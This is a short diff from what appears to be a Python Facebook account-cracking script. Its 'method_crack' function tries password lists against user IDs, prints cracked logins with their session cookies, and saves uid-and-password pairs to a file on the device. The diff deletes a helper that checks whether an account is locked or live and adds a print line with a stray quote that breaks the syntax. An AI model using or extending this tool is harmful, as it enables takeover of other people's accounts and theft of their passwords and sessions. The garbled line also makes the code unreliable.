@@ -115,17 +115,7 @@ def method_crack(ids,passlist):
                 if str(uid) in oks:
                     break
                 else:
-#----------checker---------#
-def lock_check(uid):
-    sessionx=requests.Session()
-    urlx=f'https://www.facebook.com/p/{uid}'
-    req=bxx(sessionx.get(urlx).content,'html.parser')
-    tx=req.find('title').text
-    if tx =='Facebook':
-        return('LOCK')
-    else:
-        return('LIVE')
-                    print('\r\r \033[1;32m[SBsb-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    print('\r\r \033[1;32m['SBsb-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                     coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                     print('\033[1;32m [COOKIES] '+coki)
                     open('/sdcard/SBsb-OK.txt','a').write(str(uid)+' | '+pas+'\n')
